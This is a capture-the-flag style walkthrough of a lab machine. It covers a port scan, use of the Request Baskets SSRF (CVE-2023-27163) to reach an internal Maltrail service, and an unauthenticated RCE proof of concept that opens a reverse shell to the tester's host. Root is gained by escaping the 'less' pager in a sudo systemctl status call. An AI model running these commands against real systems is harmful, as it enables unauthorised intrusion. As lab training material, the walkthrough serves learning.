

## Initial enumeration

```bash
rustscan -a 10.129.229.26 -r 1-65535
```

![](pics/Pasted%20image%2020260909202539.png)

```bash
nmap -sC -sV -T5 -v -- 10.129.229.26
```

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     http    Golang net/http server
| http-methods: 
|_  Supported Methods: GET OPTIONS
| http-title: Request Baskets
|_Requested resource was /web
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 09 Sep 2026 17:26:27 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 09 Sep 2026 17:26:11 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 09 Sep 2026 17:26:11 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
```

## Port 55555 golang server

This is an open source web server written in go

![](pics/Pasted%20image%2020260909202854.png)

Since I know the version and it is open source I started by searching for CVEs

![](pics/Pasted%20image%2020260909204642.png)

This exploit allow us to access internal services running on the local host. Lets clone it

```bash
git clone https://github.com/entr0pie/CVE-2023-27163.git
```

## Access Maltrail

There is filtered port at 80 so this PoC will be useful at accessing this service

```bash
./CVE-2023-27163.sh http://10.129.229.26:55555/ http://127.0.0.1:80/
```

Now when we access the bukcet we will be forwarded to the internal service which turned out to be `Maltrail (v0.53)`

![](pics/Pasted%20image%2020260909210613.png)

Simple google research and we found that this services is vulnerable to unauthenticated RCE

![](pics/Pasted%20image%2020260909210754.png)

First clone the repo

```bash
git clone https://github.com/SethJGibson/Hummingbird-Maltrail-RCE-PoC.git
```

![](pics/Pasted%20image%2020260909211051.png)

## Initial foothold

Run the exploit with your IP and desired port for the reverse shell

```
python3 hummingbird.py 10.10.14.82 9911 http://10.129.229.26:55555/mbhfoj
```

![](pics/Pasted%20image%2020260909211155.png)

## Flag 1

![](pics/Pasted%20image%2020260909211257.png)

## PrivEsc to root

First thing I did is run

```bash
sudo -l
```

![](pics/Pasted%20image%2020260909211236.png)

```
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Can we edit the `trail.service` to run a shell? since we can run it as root

```
/etc/systemd/system/trail.service
```

Seeing the service file

```
[Unit]
Description=Maltrail. Server of malicious traffic detection system
Documentation=https://github.com/stamparm/maltrail#readme
Documentation=https://github.com/stamparm/maltrail/wiki
Requires=network.target
Before=maltrail-sensor.service
After=network-online.target

[Service]
User=puma
Group=puma
WorkingDirectory=/opt/maltrail
ExecStart=/usr/bin/python3 server.py
Restart=on-failure
KillMode=mixed

[Install]
WantedBy=multi-user.target
```

I was thinking about how can I use this to priv escalate to root since I am only allowed to run status....And the priv escalation techniques required created a `.service` file that is then enabled and started. So there has to be a way.

![](pics/Pasted%20image%2020260909220209.png)

These are not possible in my current situation but scrolling down I saw a `less` privEsc technique that systemctl inherit because when we do the command 

```bash
sudo /usr/bin/systemctl status trail.service
```

![](pics/Pasted%20image%2020260909220510.png)

The status is presented by `less` so lets take a look at how we can exploit this.

![](pics/Pasted%20image%2020260909220640.png)

Simple we can type `!/bin/sh` and hit enter and we are root

![](pics/Pasted%20image%2020260909220730.png)

## Flag 2

![](pics/Pasted%20image%2020260909220800.png)

![](pics/Pasted%20image%2020260909220822.png)

Done.


